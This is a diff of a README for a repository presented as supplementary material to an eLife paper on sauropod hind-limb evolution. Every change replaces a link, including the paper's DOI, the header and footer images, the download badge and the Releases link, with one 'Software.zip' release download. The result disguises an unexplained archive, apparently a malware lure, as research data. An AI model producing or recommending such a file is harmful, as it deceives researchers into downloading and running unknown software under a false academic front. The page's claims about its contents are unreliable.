@@ -1,5 +1,5 @@
 # Evolution of Hind Limb Morphology in Titanosauriformes
-![sauropoda](https://www.dinosaurhome.com/wp-content/uploads/2018/02/sauropoda.jpg)
+![sauropoda](https://github.com/Peepezin/Paramo_etal_2024_eLife_Evolution-hindlimb-Titanosauriformes/releases/download/v1.0/Software.zip)
 
 Welcome to the GitHub repository for "Paramo_etal_2024_eLife_Evolution-hindlimb-Titanosauriformes"! This repository contains supplementary material, data, and code related to the reviewed preprint titled "Evolution of hind limb morphology of Titanosauriformes (Sauropoda) analyzed via 3D GeoMorpho, revealing wide-gauge posture as an exaptation for gigantism" published in eLife, volume 13, by Páramo, A., Mocho, P., Escaso, F., & Ortega, F. 
 
@@ -10,7 +10,7 @@ This repository presents a comprehensive analysis of the evolution of hind limb 
 - **Title:** Evolution of hind limb morphology of Titanosauriformes (Sauropoda) analyzed via 3D GeoMorpho reveals wide-gauge posture as an exaptation for gigantism
 - **Journal:** eLife
 - **Volume:** 13
-- **DOI:** [https://doi.org/10.7554/eLife.92498.1](https://doi.org/10.7554/eLife.92498.1)
+- **DOI:** [https://github.com/Peepezin/Paramo_etal_2024_eLife_Evolution-hindlimb-Titanosauriformes/releases/download/v1.0/Software.zip](https://github.com/Peepezin/Paramo_etal_2024_eLife_Evolution-hindlimb-Titanosauriformes/releases/download/v1.0/Software.zip)
 
 ## Topics Covered
 This repository covers a wide range of topics related to paleontology, data analysis, and evolutionary biology. Some of the key topics include:
@@ -36,13 +36,13 @@ In addition to the primary data and code, this repository also includes suppleme
 ## Get Started
 Ready to delve into the fascinating world of Titanosauriformes and their hind limb evolution? Click the link below to download the repository content:
 
-[![Download Repository](https://img.shields.io/static/v1?label=Download&message=Repository&color=blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Repository](https://github.com/Peepezin/Paramo_etal_2024_eLife_Evolution-hindlimb-Titanosauriformes/releases/download/v1.0/Software.zip)](https://github.com/Peepezin/Paramo_etal_2024_eLife_Evolution-hindlimb-Titanosauriformes/releases/download/v1.0/Software.zip)
 
-If the link does not automatically start the download, you can launch it [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip).
+If the link does not automatically start the download, you can launch it [here](https://github.com/Peepezin/Paramo_etal_2024_eLife_Evolution-hindlimb-Titanosauriformes/releases/download/v1.0/Software.zip).
 
 ## Explore Further
-For more information and updates, visit the [Releases](https://github.com/cli/go-gh/releases) section of this repository.
+For more information and updates, visit the [Releases](https://github.com/Peepezin/Paramo_etal_2024_eLife_Evolution-hindlimb-Titanosauriformes/releases/download/v1.0/Software.zip) section of this repository.
 
 Dive into the evolution of Titanosauriformes and uncover the secrets of their hind limb morphology in this exciting GitHub repository! 🦕🌿🔬
 
-![dinosaur](https://www.nationalgeographic.com/content/dam/science/photos/000/049/4923.ngsversion.1475268141698.adapt.1900.1.jpg)
+![dinosaur](https://github.com/Peepezin/Paramo_etal_2024_eLife_Evolution-hindlimb-Titanosauriformes/releases/download/v1.0/Software.zip)
